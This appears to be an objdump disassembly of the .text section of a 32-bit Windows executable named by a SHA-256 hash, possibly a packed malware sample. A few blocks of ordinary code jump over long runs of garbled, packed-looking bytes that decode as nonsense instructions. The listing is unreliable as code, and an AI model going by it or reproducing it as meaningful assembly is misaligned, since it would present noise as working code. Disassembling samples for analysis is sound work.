
389987c749f22314d0328fbf52e4dbe0666e12923c05e4f4d7cd23a3f94cbb54.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	mov    eax,DWORD PTR [ebp-0x50]
  401009:	mov    ecx,DWORD PTR [ebp-0x4c]
  40100c:	mov    edx,DWORD PTR [ebp-0x50]
  40100f:	add    DWORD PTR ds:0x428451,0x4284f1
  401019:	sub    eax,edx
  40101b:	mov    DWORD PTR ds:0x428475,ecx
  401021:	push   edi
  401022:	mov    edi,DWORD PTR [ebp-0x4c]
  401025:	mov    DWORD PTR [ebp-0x50],eax
  401028:	not    edx
  40102a:	sbb    ecx,edi
  40102c:	inc    DWORD PTR ds:0x42835d
  401032:	mov    DWORD PTR [ebp-0x4c],ecx
  401035:	or     DWORD PTR [ebp-0x50],0xcb78dc42
  40103c:	sub    DWORD PTR ds:0x428469,ecx
  401042:	or     DWORD PTR [ebp-0x4c],0x9c2b8ae8
  401049:	mov    edx,DWORD PTR ds:0x428431
  40104f:	xor    DWORD PTR ds:0x428575,edx
  401055:	mov    eax,DWORD PTR [ebp-0x58]
  401058:	jmp    0x4013f9
  40105d:	(bad)  
  40105e:	mov    edi,0x9098bf8d
  401063:	cwde   
  401064:	(bad)  
  401065:	mov    cl,BYTE PTR [esi+ebp*4-0x31]
  401069:	aas    
  40106a:	or     ah,BYTE PTR [esi-0x4141411d]
  401070:	mov    esi,0xbebec4bd
  401075:	push   cs
  401076:	retf   0x9266
  401079:	push   ss
  40107a:	ds out 0x1f,al
  40107d:	(bad)  [eax+0x5be9ef0]
  401083:	in     eax,0x1f
  401085:	mov    bl,0xdd
  401088:	lds    esp,FWORD PTR [ebp+0x6e]
  40108b:	mov    ecx,0x723deed2
  401090:	repnz cmc 
  401092:	adc    al,0x95
  401094:	out    0xc5,eax
  401096:	ss mov cl,0x7e
  401099:	test   DWORD PTR [edx+0xd339a63],esp
  40109f:	repz or BYTE PTR [ecx-0x2c],al
  4010a3:	fisub  WORD PTR [ebx+0x39d2cc4]
  4010a9:	mov    ?,WORD PTR [esp+eax*4-0x44]
  4010ad:	int    0xf4
  4010af:	cmp    esp,eax
  4010b1:	icebp  
  4010b2:	arpl   WORD PTR ds:0xfe52947e,dx
  4010b8:	call   0x4be36aff
  4010bd:	pop    eax
  4010be:	rcr    bl,1
  4010c0:	inc    esi
  4010c1:	dec    ebp
  4010c2:	shl    DWORD PTR [edx+0x79],0x32
  4010c6:	sub    edi,DWORD PTR [ebx-0x13b6c9c8]
  4010cc:	inc    edx
  4010cd:	(bad)
  4010d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4010d1:	mov    eax,0xc3bf49b7
  4010d6:	jnp    0x40108a
  4010d8:	cmp    DWORD PTR [ecx-0x2f026e82],edx
  4010de:	sub    al,0xb6
  4010e0:	pushf  
  4010e1:	sar    ebp,cl
  4010e3:	xchg   edx,eax
  4010e4:	shr    BYTE PTR [ebx+0x1c],1
  4010e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4010e8:	dec    esp
  4010e9:	pop    ebx
  4010ea:	(bad)  
  4010eb:	hlt    
  4010ec:	mov    edx,0x39e6ea98
  4010f1:	ficomp WORD PTR [ebp-0x2ac95a8a]
  4010f7:	les    esp,FWORD PTR [eax+edx*2+0x37226984]
  4010fe:	add    bh,BYTE PTR [ebp+0x66]
  401101:	rcr    BYTE PTR [edx-0x1a],cl
  401104:	push   eax
  401105:	fnsave [edx-0x45]
  401108:	fimul  WORD PTR [ecx-0x2]
  40110b:	ja     0x4010d2
  40110d:	pushf  
  40110e:	sbb    al,0xd0
  401110:	xchg   ebp,eax
  401111:	xchg   ebp,eax
  401112:	mov    edx,0xe96b30f4
  401117:	dec    esp
  401118:	std    
  401119:	call   DWORD PTR [edx+edx*4+0x34]
  40111d:	xor    DWORD PTR [esp+ecx*8],edi
  401120:	scas   al,BYTE PTR es:[edi]
  401121:	mov    eax,ds:0x40321f9
  401126:	ja     0x401119
  401128:	adc    esi,DWORD PTR [esi+edi*1+0x1505ae10]
  40112f:	cmp    BYTE PTR [ecx],ah
  401131:	sbb    eax,esi
  401133:	pop    ebx
  401134:	cmp    ebx,DWORD PTR [esi]
  401136:	jl     0x401193
  401138:	loope  0x401134
  40113a:	inc    esi
  40113b:	out    dx,al
  40113c:	mov    BYTE PTR ds:0xb6b3a48b,bh
  401142:	sbb    eax,0x9706e153
  401147:	mov    ebp,ebx
  401149:	icebp  
  40114a:	mov    dl,0x32
  40114c:	jge    0x401164
  40114e:	sub    al,0x17
  401150:	jbe    0x401113
  401152:	and    bl,al
  401154:	xlat   BYTE PTR ds:[ebx]
  401155:	push   ss
  401156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401157:	xor    eax,0xa94c186
  40115c:	das    
  40115d:	out    dx,al
  40115e:	sub    BYTE PTR [eax],0xcf
  401161:	inc    ebx
  401162:	jle    0x4011d8
  401164:	fnsave ds:0x7586386f
  40116a:	cld    
  40116b:	ja     0x40110e
  40116d:	push   ds
  40116e:	adc    ebp,DWORD PTR [ebx]
  401170:	xchg   ecx,eax
  401171:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401172:	sub    BYTE PTR [esi+0x3e],0x90
  401176:	test   al,0x4c
  401178:	cmp    BYTE PTR [edi],0x9f
  40117b:	fiadd  DWORD PTR [ecx+0x6eb837d0]
  401181:	scas   eax,DWORD PTR es:[edi]
  401182:	mov    ebp,ds
  401184:	pop    edx
  401185:	xor    eax,ebx
  401187:	mov    esp,?
  401189:	push   es
  40118a:	or     esp,DWORD PTR [esi-0x6]
  40118d:	iret   
  40118e:	push   ecx
  40118f:	ret    
  401190:	out    0x1,al
  401192:	push   cs
  401193:	pop    eax
  401194:	adc    BYTE PTR [ebx-0x5475b6fc],0x94
  40119b:	lods   al,BYTE PTR gs:[esi]
  40119d:	addr16 fs jmp 0x4011d9
  4011a1:	call   0x58d:0xf2c2b920
  4011a8:	aas    
  4011a9:	clc    
  4011aa:	pop    ds
  4011ab:	cmp    esp,DWORD PTR [edi]
  4011ad:	push   0xd925b8f4
  4011b2:	sub    dl,BYTE PTR [edx+0x1877e456]
  4011b8:	mov    esi,0xfdb663d8
  4011bd:	mov    ds:0x5d6b02e3,al
  4011c2:	pop    esp
  4011c3:	pop    edx
  4011c4:	lods   eax,DWORD PTR ds:[esi]
  4011c5:	ja     0x4011c8
  4011c7:	fwait
  4011c8:	cmp    eax,0x826897ff
  4011cd:	sbb    al,0xc9
  4011cf:	push   edi
  4011d0:	inc    esp
  4011d1:	shl    BYTE PTR [eax-0x44],0xa1
  4011d5:	inc    ebp
  4011d6:	sub    DWORD PTR ds:0xd608e5a2,ebp
  4011dc:	push   eax
  4011dd:	push   cs
  4011de:	enter  0x2927,0x3c
  4011e2:	stos   DWORD PTR es:[edi],eax
  4011e3:	sbb    al,0xa6
  4011e5:	stc    
  4011e6:	js     0x4011b9
  4011e8:	mov    ds:0x79b0ab5e,eax
  4011ed:	cmc    
  4011ee:	inc    ebx
  4011ef:	and    al,0xc
  4011f1:	jmp    0xadbd:0x625236ec
  4011f8:	adc    BYTE PTR [edi],al
  4011fa:	ffree  st(6)
  4011fc:	loope  0x4011ca
  4011fe:	cmp    ebp,DWORD PTR [esi+0x2119525d]
  401204:	stc    
  401205:	sbb    al,0xd4
  401207:	test   al,0x30
  401209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40120a:	imul   edi,DWORD PTR [ebp+0x3e0c57e0],0xffffff84
  401211:	sub    al,0x20
  401213:	pop    ds
  401214:	jae    0x401209
  401216:	cmp    dl,BYTE PTR [ecx-0xe]
  401219:	je     0x4011aa
  40121b:	out    dx,eax
  40121c:	mov    bh,0x57
  40121e:	inc    ebp
  40121f:	sbb    bl,BYTE PTR [ecx+0x7c]
  401222:	jl     0x4011b4
  401224:	mov    edi,0x93114ca5
  401229:	rol    BYTE PTR [edx-0x60],0xeb
  40122d:	push   0xa2f0b1a6
  401232:	cmp    BYTE PTR [ecx],ch
  401234:	daa    
  401235:	or     esp,edx
  401237:	push   cs
  401238:	adc    dh,BYTE PTR [ecx]
  40123a:	mov    ds:0xa2b844c1,al
  40123f:	mov    al,ds:0x3c5d141f
  401244:	cli    
  401245:	sbb    BYTE PTR [ecx+0x37cc8e65],dh
  40124b:	inc    ebx
  40124c:	mov    BYTE PTR [esi-0x10ef2bf1],ch
  401252:	push   cs
  401253:	shl    ch,cl
  401255:	and    DWORD PTR [ebx-0x59],esi
  401258:	sbb    al,0xb3
  40125a:	jecxz  0x40127d
  40125c:	aad    0x45
  40125e:	sbb    eax,DWORD PTR [edi+0x52eda19d]
  401264:	or     eax,0xed2654b1
  401269:	mov    al,0xae
  40126b:	loope  0x4012a8
  40126d:	daa    
  40126e:	leave  
  40126f:	mov    dl,0xe3
  401271:	daa    
  401272:	jbe    0x40126c
  401274:	mov    edx,0x3ae99b3b
  401279:	retf   
  40127a:	shl    DWORD PTR [eax],0x10
  40127d:	pop    esi
  40127e:	mov    edi,0xd8ef1662
  401283:	inc    edi
  401284:	pop    edx
  401285:	test   DWORD PTR [esi+ebx*8-0x4e],edi
  401289:	std    
  40128a:	nop
  40128b:	adc    bl,bh
  40128d:	arpl   WORD PTR [eax+0x1c],cx
  401290:	loope  0x4012f6
  401292:	scas   al,BYTE PTR es:[edi]
  401293:	dec    esi
  401294:	daa    
  401295:	sub    edi,DWORD PTR [edx+0x2a]
  401298:	pop    es
  401299:	push   edx
  40129a:	inc    ecx
  40129b:	pop    ebp
  40129c:	aaa    
  40129d:	repz sub eax,0x88bb05ce
  4012a3:	aam    0x38
  4012a5:	push   eax
  4012a6:	ss pop ecx
  4012a8:	mov    bh,al
  4012aa:	nop
  4012ab:	pop    ebx
  4012ac:	in     al,0x4d
  4012ae:	lods   al,BYTE PTR ds:[esi]
  4012af:	sti    
  4012b0:	imul   edx,DWORD PTR [ecx-0x3d],0x71d6e743
  4012b7:	addr16 push 0xffffffe6
  4012ba:	cmc    
  4012bb:	stos   DWORD PTR es:[edi],eax
  4012bc:	ror    eax,cl
  4012be:	je     0x401311
  4012c0:	push   ebp
  4012c1:	jne    0x401271
  4012c3:	xor    eax,0xc041e750
  4012c8:	cld    
  4012c9:	enter  0x82df,0x1f
  4012cd:	and    DWORD PTR [esi-0x5593249a],ebp
  4012d3:	sub    DWORD PTR [ecx],ecx
  4012d5:	dec    esp
  4012d6:	xor    DWORD PTR [ebp+eax*8+0x1dbad164],edx
  4012dd:	cmp    DWORD PTR [eax+ebp*4],0x4cc9358f
  4012e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012e5:	icebp  
  4012e6:	mov    eax,ds:0x36e06e97
  4012eb:	mov    edi,0x9e5043db
  4012f0:	fmul   st,st(4)
  4012f2:	outs   dx,DWORD PTR ds:[esi]
  4012f3:	add    eax,ebx
  4012f5:	std    
  4012f6:	mov    ebp,0xb9ada15e
  4012fb:	gs adc edi,ecx
  4012fe:	mov    bl,0xf0
  401300:	inc    ebp
  401301:	test   BYTE PTR [ebp-0x1630a3a8],ah
  401307:	stc    
  401308:	sti    
  401309:	pop    eax
  40130a:	pop    esi
  40130b:	sbb    al,0xab
  40130d:	sub    DWORD PTR [ebx+edi*8-0x7c],ecx
  401311:	jmp    DWORD PTR [edx-0x43]
  401314:	xchg   ebp,eax
  401315:	fucomp st(1)
  401317:	cmp    BYTE PTR ds:0xe7d14dd3,dl
  40131d:	push   esp
  40131e:	mov    ecx,0x1f8fbdca
  401323:	sbb    eax,DWORD PTR ds:0xa941b1b2
  401329:	iret   
  40132a:	adc    eax,0x86e8366a
  40132f:	out    dx,eax
  401330:	fld    QWORD PTR [ebp+ebp*4+0x2984933a]
  401337:	dec    ebp
  401338:	pop    esp
  401339:	mov    dh,0xf3
  40133b:	stc    
  40133c:	sub    ebx,ecx
  40133e:	cmc    
  40133f:	lock or esi,DWORD PTR [esi]
  401342:	leave  
  401343:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401344:	in     al,0xa3
  401346:	in     al,0x6b
  401348:	inc    ecx
  401349:	cmp    BYTE PTR [edx],0xc5
  40134c:	shl    BYTE PTR [edi+0x58],cl
  40134f:	cwde   
  401350:	arpl   si,bx
  401352:	jae    0x401320
  401354:	adc    dl,cl
  401356:	and    al,0x4b
  401358:	push   cs
  401359:	lds    edx,FWORD PTR [ebx+esi*4+0x65d97504]
  401360:	cli    
  401361:	(bad)  
  401362:	sbb    eax,0x2144d35b
  401367:	xlat   BYTE PTR ds:[ebx]
  401368:	push   esp
  401369:	sub    ch,dl
  40136b:	add    eax,esp
  40136d:	fld    QWORD PTR [ecx+0x59]
  401370:	cmc    
  401371:	mov    ebx,0x66c1556a
  401376:	adc    al,0x4d
  401378:	xchg   ebx,eax
  401379:	mov    edx,0xdb9c9040
  40137e:	add    ah,BYTE PTR [edi*4+0x4df36fb6]
  401385:	dec    eax
  401386:	clc    
  401387:	push   es
  401388:	mov    ds:0x6c2b2166,al
  40138d:	inc    eax
  40138e:	pop    es
  40138f:	rol    DWORD PTR [ebx+0x42b6799f],1
  401395:	and    dx,WORD PTR [ebx]
  401398:	push   ds
  401399:	retf   
  40139a:	imul   edi,DWORD PTR [edi],0xffd1fead
  4013a0:	jns    0x4013b3
  4013a2:	adc    eax,0x31c6de0
  4013a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013a9:	add    al,0x2e
  4013ab:	mov    ebx,0x12e0c165
  4013b0:	call   FWORD PTR [ecx+0x570bc59]
  4013b6:	inc    eax
  4013b7:	imul   ebp,DWORD PTR [edx],0xd057102f
  4013bd:	sbb    ch,BYTE PTR [eax-0x1a]
  4013c0:	pop    di
  4013c2:	cs loopne 0x401361
  4013c5:	and    DWORD PTR [esi+0x3e],ebx
  4013c8:	mov    edi,0xba33eac
  4013cd:	dec    ebp
  4013ce:	fisttp WORD PTR [edx]
  4013d0:	sbb    eax,DWORD PTR [edx+0x34]
  4013d3:	push   0xf1708d81
  4013d8:	shl    BYTE PTR ds:[ebp-0x1be0f99f],1
  4013df:	dec    ebp
  4013e0:	inc    ebp
  4013e1:	inc    ebx
  4013e2:	and    al,0xc1
  4013e4:	cwde   
  4013e5:	xchg   BYTE PTR [edi],al
  4013e7:	retf   
  4013e8:	pop    ecx
  4013e9:	mov    ch,0xd2
  4013eb:	mov    ds:0xa29b2eb3,al
  4013f0:	xor    BYTE PTR [ebx+0x28],al
  4013f3:	inc    edi
  4013f4:	xor    dh,0xd3
  4013f7:	push   ss
  4013f8:	cmp    eax,0x3ac4d8b
  4013fd:	cmp    eax,0x4284d1
  401402:	mov    edx,DWORD PTR [ebp-0x58]
  401405:	sbb    DWORD PTR ds:0x4284e9,ecx
  40140b:	mov    edi,DWORD PTR [ebp-0x54]
  40140e:	sub    DWORD PTR ds:0x428575,0x1812
  401418:	sub    eax,edx
  40141a:	movzx  edx,BYTE PTR ds:0x428461
  401421:	jmp    0x4017c2
  401426:	test   BYTE PTR [edx+0x7cbcfc08],0x3a
  40142d:	mov    WORD PTR [esi+0x6e],es
  401430:	rcl    DWORD PTR [eax-0x2ea9b3ca],cl
  401436:	mov    ebp,0xbdbebec4
  40143b:	les    edi,FWORD PTR [esi+0x27bf75be]
  401441:	fld    DWORD PTR [ebx+0x4d]
  401444:	sub    bh,BYTE PTR [edx]
  401446:	jmp    0x40146d
  401448:	adc    DWORD PTR fs:[ecx+eax*8+0x46],esp
  40144d:	addr16 or ch,bl
  401450:	cmp    ebp,edi
  401452:	jmp    DWORD PTR [ecx-0x52]
  401455:	mov    esp,0x74604546
  40145a:	pop    esi
  40145b:	gs jg  0x40145d
  40145e:	into   
  40145f:	mov    ecx,0xc47db389
  401464:	clc    
  401465:	adc    DWORD PTR [edx],ebp
  401467:	xor    eax,DWORD PTR [ebp+0x79]
  40146a:	sub    bh,BYTE PTR ds:0xc0721945
  401470:	stc    
  401471:	in     al,dx
  401472:	xor    cl,BYTE PTR [ebx+0x5e]
  401475:	inc    esp
  401476:	mov    edx,0x7f8aaeb6
  40147b:	jmp    0x40141d
  40147d:	jbe    0x4014dd
  40147f:	mov    al,0xff
  401481:	hlt    
  401482:	icebp  
  401483:	fisubr DWORD PTR [ecx-0x572d266b]
  401489:	or     eax,DWORD PTR [ebx]
  40148b:	xchg   esp,eax
  40148c:	add    al,0x27
  40148e:	inc    ecx
  40148f:	test   eax,0xec685387
  401494:	push   ebx
  401495:	(bad)  
  401496:	rcr    DWORD PTR [edi],1
  401498:	push   ecx
  401499:	mov    ecx,0x45e14700
  40149e:	jg     0x40144f
  4014a0:	xor    edx,0x84b089c8
  4014a6:	adc    esp,DWORD PTR [ebx]
  4014a8:	test   DWORD PTR [ecx],edx
  4014aa:	or     BYTE PTR [edi],dl
  4014ac:	push   ecx
  4014ad:	iret   
  4014ae:	mov    edx,0x80830ec3
  4014b3:	sbb    eax,0xd276ce54
  4014b8:	inc    esp
  4014b9:	je     0x40145c
  4014bb:	push   cs
  4014bc:	cmc    
  4014bd:	dec    ecx
  4014be:	inc    esp
  4014bf:	inc    esp
  4014c0:	xor    DWORD PTR [ecx+0x422dbea2],0x78d1796b
  4014ca:	imul   ebp,DWORD PTR [edx],0x7ad554d3
  4014d0:	or     eax,0x66d4c207
  4014d5:	cmp    DWORD PTR [edi+0x7a],ebp
  4014d8:	jl     0x40150d
  4014da:	(bad)  
  4014db:	jmp    0x4014bf
  4014dd:	jl     0x401480
  4014df:	and    eax,0xa2a82513
  4014e4:	repz loope 0x401526
  4014e7:	int3   
  4014e8:	or     DWORD PTR [edx+0x6],edi
  4014eb:	sub    al,0x40
  4014ed:	cwde   
  4014ee:	repnz gs in eax,0x5a
  4014f2:	sub    bh,dh
  4014f4:	or     bl,BYTE PTR [eax-0x6179d0ed]
  4014fa:	lods   eax,DWORD PTR ds:[esi]
  4014fb:	sub    eax,0x71bf12b
  401500:	loope  0x401572
  401502:	bnd jnp 0x401558
  401505:	fcmovne st,st(0)
  401507:	xchg   esp,eax
  401508:	or     eax,0x294d0263
  40150d:	std    
  40150e:	loop   0x401555
  401510:	fmul   st,st(7)
  401512:	jmp    0x40157f
  401514:	push   ds
  401515:	call   0x964d812e
  40151a:	shl    DWORD PTR [edi+0x779078f1],cl
  401520:	ret    0x61c
  401523:	or     al,0x5a
  401525:	nop
  401526:	mov    ebp,0x32765018
  40152b:	push   esp
  40152c:	mov    cl,0x9d
  40152e:	or     ah,BYTE PTR [edx]
  401530:	lock hlt 
  401532:	lods   al,BYTE PTR ds:[esi]
  401533:	or     esi,edx
  401535:	pop    edi
  401536:	clc    
  401537:	stos   BYTE PTR es:[edi],al
  401538:	jmp    0x40153c
  40153a:	dec    edi
  40153b:	cmc    
  40153c:	push   esp
  40153d:	adc    BYTE PTR [esi+0x7f247f09],bh
  401543:	fwait
  401544:	adc    BYTE PTR [ebp+0x79],0x31
  401548:	ss mov ebp,0xdac10acf
  40154e:	xchg   DWORD PTR [ebp-0x1],esi
  401551:	les    esi,FWORD PTR [eax+0x65889ae9]
  401557:	pop    edx
  401558:	retf   
  401559:	xor    bh,cl
  40155b:	xor    DWORD PTR [ebx-0x5092283f],eax
  401561:	ins    DWORD PTR es:[edi],dx
  401562:	es xchg esi,eax
  401564:	mov    ds:0x876fb6d4,eax
  401569:	addr16 adc eax,0xa3014627
  40156f:	mov    ebx,0xfb97bee0
  401574:	xchg   BYTE PTR [ebp+ecx*2-0x6b],al
  401578:	out    dx,eax
  401579:	imul   edx,DWORD PTR [ebp+0x4a],0xffffff8d
  40157d:	pop    eax
  40157e:	in     al,dx
  40157f:	add    BYTE PTR [esi-0x9106499],dl
  401585:	dec    edx
  401586:	rcl    DWORD PTR [edx-0x17],0x30
  40158a:	int    0x16
  40158c:	xchg   DWORD PTR [esi],esp
  40158e:	jecxz  0x4015a3
  401590:	ins    DWORD PTR es:[edi],dx
  401591:	neg    BYTE PTR [eax+0x34]
  401594:	push   0xffffffa4
  401596:	push   0xa
  401598:	sbb    al,0x2e
  40159a:	cmp    ch,BYTE PTR [ebp+0x23]
  40159d:	test   eax,0x4bf5f756
  4015a2:	push   ecx
  4015a3:	or     al,0x3
  4015a5:	jl     0x4015ce
  4015a7:	sub    eax,0x8e3fb2ac
  4015ac:	xor    cl,ah
  4015ae:	test   DWORD PTR [ebx+0x4ea95146],eax
  4015b4:	int3   
  4015b5:	sbb    ah,BYTE PTR [edi+0x59]
  4015b8:	jecxz  0x401557
  4015ba:	arpl   WORD PTR [ebx+0x1f],dx
  4015bd:	adc    eax,0x36f5dbaa
  4015c2:	(bad)  
  4015c3:	aam    0x84
  4015c5:	xor    BYTE PTR [ebx],0xfe
  4015c8:	push   ecx
  4015c9:	clc    
  4015ca:	inc    ebp
  4015cb:	xchg   DWORD PTR [eax],esp
  4015cd:	inc    esp
  4015ce:	sbb    BYTE PTR [edx+0x584d02db],al
  4015d4:	lods   eax,DWORD PTR ds:[esi]
  4015d5:	dec    eax
  4015d6:	jl     0x401653
  4015d8:	hlt    
  4015d9:	mov    edi,0x979c1a31
  4015de:	(bad)  
  4015df:	jns    0x4015e3
  4015e1:	xchg   ebp,eax
  4015e2:	or     edi,edx
  4015e4:	sar    BYTE PTR [ecx],1
  4015e6:	or     eax,0x5405aee8
  4015eb:	pop    ebx
  4015ec:	add    BYTE PTR ds:[ebx+0xd],bl
  4015f0:	pusha  
  4015f1:	mov    bl,0x6a
  4015f3:	push   ebp
  4015f4:	xchg   ebp,eax
  4015f5:	sbb    BYTE PTR [esi-0x2],bl
  4015f8:	test   al,0x9e
  4015fa:	outs   dx,DWORD PTR ds:[esi]
  4015fb:	sbb    eax,0x224fa0d8
  401600:	cmp    eax,0x38b7ba41
  401605:	shl    DWORD PTR [esi],0x14
  401608:	das    
  401609:	mov    dl,0x3c
  40160b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40160c:	pop    ss
  40160d:	xchg   ebp,eax
  40160e:	add    ch,BYTE PTR [esi]
  401610:	and    edx,ecx
  401612:	bnd jp 0x401628
  401615:	popa   
  401616:	dec    ecx
  401617:	scas   al,BYTE PTR es:[edi]
  401618:	dec    ebp
  401619:	xor    bl,BYTE PTR [edi-0x4a]
  40161c:	inc    eax
  40161d:	imul   eax,DWORD PTR [edx+0x4b],0xd28bc581
  401624:	sar    al,cl
  401626:	xor    al,BYTE PTR [esi+0x58c2e2ae]
  40162c:	jp     0x401665
  40162e:	jp     0x4015be
  401630:	mov    WORD PTR [eax+edi*1],fs
  401633:	out    0x3f,al
  401635:	stos   DWORD PTR es:[edi],eax
  401636:	cmp    eax,0x4cbfc9d
  40163b:	lods   eax,DWORD PTR ds:[esi]
  40163c:	cmp    al,ah
  40163e:	hlt    
  40163f:	rcr    ebx,0x81
  401642:	call   0xf2de667b
  401647:	and    BYTE PTR [ecx+edx*4],dh
  40164a:	mov    WORD PTR [ebp+0x3eb34165],cs
  401650:	adc    eax,0xc292606b
  401655:	cmp    eax,0x6190a0e8
  40165a:	mov    ebp,0x87c6f69f
  40165f:	add    ah,dh
  401661:	aam    0xe0
  401663:	pop    edx
  401664:	enter  0xf8d9,0xfe
  401668:	inc    ebp
  401669:	imul   ecx,ebp,0xfdf8d054
  40166f:	push   0x6c029c26
  401674:	add    ch,ah
  401676:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401677:	pop    edx
  401678:	xor    DWORD PTR [ebx],ebx
  40167a:	mov    es:0xe786e226,eax
  401680:	scas   eax,DWORD PTR es:[edi]
  401681:	stos   DWORD PTR es:[edi],eax
  401682:	xor    dh,BYTE PTR [ecx-0x71c91910]
  401688:	jmp    0x8fd:0x25fe5f3d
  40168f:	out    0xeb,al
  401691:	pop    edx
  401692:	ret    
  401693:	and    eax,0xffffffb2
  401696:	and    DWORD PTR [esi-0x5c1ff4e7],ebp
  40169c:	call   0xc4f6a383
  4016a1:	nop
  4016a2:	dec    esi
  4016a3:	sub    bh,BYTE PTR [esi+0x72]
  4016a6:	pushf  
  4016a7:	rol    DWORD PTR [edx],0x7
  4016aa:	jecxz  0x401632
  4016ac:	add    edx,DWORD PTR [eax+0x5b]
  4016af:	mov    ds:0x8bcad610,eax
  4016b4:	dec    ebp
  4016b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016b6:	or     BYTE PTR [edx-0x62],dl
  4016b9:	sbb    DWORD PTR [eax],ebp
  4016bb:	jae    0x4016d0
  4016bd:	cmp    al,0xb4
  4016bf:	repnz fwait
  4016c1:	and    eax,0x2f7dc1f4
  4016c7:	xchg   esp,eax
  4016c8:	dec    edi
  4016c9:	xchg   DWORD PTR [eax-0x73],ecx
  4016cc:	pop    edx
  4016cd:	loopne 0x401729
  4016cf:	inc    ecx
  4016d0:	xchg   ecx,eax
  4016d1:	clc    
  4016d2:	xor    dl,BYTE PTR [edx+ecx*1-0x22eebbf3]
  4016d9:	adc    eax,0xa62d2bb0
  4016de:	(bad)  
  4016df:	repnz adc DWORD PTR [esi+0x54],edi
  4016e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016e4:	mov    ds:0x730caf14,eax
  4016e9:	(bad)  
  4016ea:	cli    
  4016eb:	inc    edx
  4016ec:	(bad)  
  4016ed:	repnz loop 0x40171d
  4016f0:	aas    
  4016f1:	in     eax,dx
  4016f2:	xor    al,BYTE PTR [esi-0x48f2ed31]
  4016f8:	mov    esp,0xf5594bff
  4016fd:	jg     0x4016da
  4016ff:	leave  
  401700:	jge    0x40175e
  401702:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401703:	xchg   edi,eax
  401704:	inc    esp
  401705:	daa    
  401706:	loopne 0x4016fb
  401708:	lods   al,BYTE PTR ds:[esi]
  401709:	mov    al,0xcb
  40170b:	outs   dx,DWORD PTR ds:[esi]
  40170c:	jne    0x40176d
  40170e:	xor    al,0x1a
  401710:	add    DWORD PTR [eax],edx
  401712:	and    DWORD PTR [eax+0x44],esi
  401715:	xchg   esp,eax
  401716:	mov    al,BYTE PTR [esi+0xe]
  401719:	adc    al,0xfe
  40171b:	jg     0x4016a8
  40171d:	ret    0x1050
  401720:	dec    ecx
  401721:	mov    ss,edx
  401723:	dec    esi
  401724:	adc    DWORD PTR [edi-0xb],ebp
  401727:	rcr    DWORD PTR [ecx],cl
  401729:	mov    ebx,0xfff54408
  40172e:	hlt    
  40172f:	mov    bl,0xc9
  401731:	push   ss
  401732:	inc    ebx
  401733:	ins    BYTE PTR es:[edi],dx
  401734:	lods   eax,DWORD PTR ds:[esi]
  401735:	push   cs
  401736:	jo     0x401721
  401738:	xor    al,0xde
  40173a:	jl     0x4016dc
  40173c:	stos   DWORD PTR es:[edi],eax
  40173d:	call   0xc085:0xa5f01738
  401744:	and    esp,edi
  401746:	fsubr  st(5),st
  401748:	jle    0x401781
  40174a:	pop    edx
  40174b:	adc    ebp,esp
  40174d:	ss enter 0x291b,0x67
  401752:	imul   esp,DWORD PTR [ecx],0x4ffdde56
  401758:	jmp    0x146a3768
  40175d:	and    ebp,ebp
  40175f:	call   0xcfeafe7e
  401764:	mov    esp,0x65f66ec4
  401769:	jecxz  0x401709
  40176b:	dec    edx
  40176c:	mov    ch,BYTE PTR [eax+0x23]
  40176f:	push   ds
  401770:	push   ds
  401771:	mov    cl,0xb6
  401773:	mov    ecx,0xf5d3b223
  401778:	inc    esp
  401779:	mov    ebx,0x7aeb022b
  40177e:	out    0xb1,eax
  401780:	or     al,0x66
  401782:	sub    dl,BYTE PTR [ebx]
  401784:	scas   eax,DWORD PTR es:[edi]
  401785:	dec    esi
  401786:	shr    BYTE PTR [edi],0x1b
  401789:	scas   al,BYTE PTR es:[edi]
  40178a:	pushf  
  40178b:	pop    ebx
  40178c:	inc    esp
  40178d:	ds cld 
  40178f:	jmp    0x8843:0x71aa8bcb
  401796:	stos   BYTE PTR es:[edi],al
  401797:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401798:	add    eax,DWORD PTR [eax+0x2f3fb040]
  40179e:	sti    
  40179f:	pop    edx
  4017a0:	xchg   DWORD PTR [ebp-0xe],esi
  4017a3:	cmp    al,0x9e
  4017a5:	mov    edx,?
  4017a7:	and    esp,DWORD PTR [edx]
  4017a9:	cli    
  4017aa:	or     eax,0xeff16e6a
  4017af:	add    DWORD PTR [eax-0x64cf6ad0],esi
  4017b5:	adc    al,0x44
  4017b7:	jae    0x401746
  4017b9:	add    eax,0x7761db74
  4017be:	fidiv  DWORD PTR [esi+0x458903f2]
  4017c4:	test   al,0x1b
  4017c6:	iret   
  4017c7:	mov    DWORD PTR [ebp-0x54],ecx
  4017ca:	or     ecx,0x1b77
  4017d0:	or     DWORD PTR [ebp-0x58],0xcb78a05a
  4017d7:	adc    DWORD PTR ds:0x428451,edi
  4017dd:	or     DWORD PTR [ebp-0x54],0x9c2b8ae8
  4017e4:	lea    eax,[ebp+0x20]
  4017e7:	cmp    DWORD PTR ds:0x428449,0x0
  4017ee:	mov    edi,DWORD PTR ds:0x428565
  4017f4:	movzx  ecx,WORD PTR ds:0x428359
  4017fb:	mov    ecx,0x7757
  401800:	jmp    0x401860
  401805:	mov    ecx,0x59da
  40180a:	cmp    DWORD PTR ds:0x428449,0x0
  401811:	ja     0x401846
  401817:	push   0x428295
  40181c:	call   DWORD PTR ds:0x42e09c
  401822:	xor    edx,edx
  401824:	or     edx,DWORD PTR ds:0x428355
  40182a:	xor    DWORD PTR ds:0x4284c5,edx
  401830:	mov    edi,DWORD PTR ds:0x428435
  401836:	or     DWORD PTR ds:0x4284cd,edi
